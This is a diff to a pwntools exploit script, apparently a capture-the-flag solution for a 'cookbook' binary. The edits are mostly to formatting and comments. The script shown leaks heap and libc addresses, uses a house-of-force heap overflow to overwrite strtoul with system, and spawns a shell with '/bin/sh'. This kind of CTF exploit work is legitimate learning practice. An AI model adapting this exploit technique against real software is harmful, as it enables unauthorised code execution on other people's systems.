@@ -9,7 +9,6 @@ from pwn import *
 import re
 import ctypes
 
-
 '''
 ### information leakage: 'ptr to the top chunk' can be leaked.
 
@@ -62,7 +61,6 @@ binlist  [ptr to the top chunk] [NULL]
         continue
 '''
 
-
 r = process('./cookbook')
 
 b = ELF('./cookbook')
@@ -80,7 +78,6 @@ def stou(i):
 if __name__ == '__main__':
     r.recvuntil("what's your name?")
     s('babo')
-
 
     #
     # LEAK TOP CHUNK (needed to do house-of-force)
@@ -107,7 +104,7 @@ if __name__ == '__main__':
     r.recvuntil("[q]uit")
 
     #
-    # CREATE FAKE CHUNK & LEAK calloc@got
+    # CREATE FAKE CHUNK & LEAK calloc@got & calc LIBC_BASE
     #
 
     s('g') 
@@ -135,15 +132,15 @@ if __name__ == '__main__':
     LIBC_BASE = LEAKED - libc.symbols['calloc']
     log.info('LIBC_BASE: 0x%x' % LIBC_BASE)
 
+    #
+    # exploit heap overflow & overwrite heap wilderness
+    #
+
     NEW_TOP_CHUNK = TOP_CHUNK + (0x8ad5ae8-0x8ad56d8)
     DEADBEEF = NEW_TOP_CHUNK - (0x8ad5ae8-0x8ad576c)
 
     log.info('NEW_TOP_CHUNK: 0x%x' % NEW_TOP_CHUNK)
     log.info('DEADBEEF: 0x%x' % DEADBEEF)
-
-    #
-    # exploit heap overflow & overwrite heap wilderness
-    #
 
     s('n') # malloc()
     s('g')
@@ -163,7 +160,7 @@ if __name__ == '__main__':
     s(p32(LIBC_BASE+SYSTEM_OFFSET))  # overwrite, now strtoul == system
 
     s('g')
-    s('/bin/sh\0') # doning strtoul('/bin/sh\0') 
+    s('/bin/sh\0') # doing strtoul('/bin/sh\0') 
     
     r.clean()
     r.interactive()
